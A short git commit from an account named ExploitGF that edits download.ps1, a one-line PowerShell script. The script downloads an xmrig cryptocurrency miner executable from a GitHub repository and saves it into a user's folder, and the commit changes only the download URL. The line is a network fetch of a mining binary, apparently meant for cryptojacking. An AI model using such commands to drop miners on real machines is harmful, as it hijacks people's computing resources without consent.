06863226ebe047e50aab5d1a03d18793a647fac7
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-28 16:18:43 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/ExploitGF/mine/blob/master/xmrig.exe","C:\Users\Admin\xmrig.exe")
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/ExploitGF/mine/blob/master/xmrig","C:\Users\Admin\xmrig.exe")
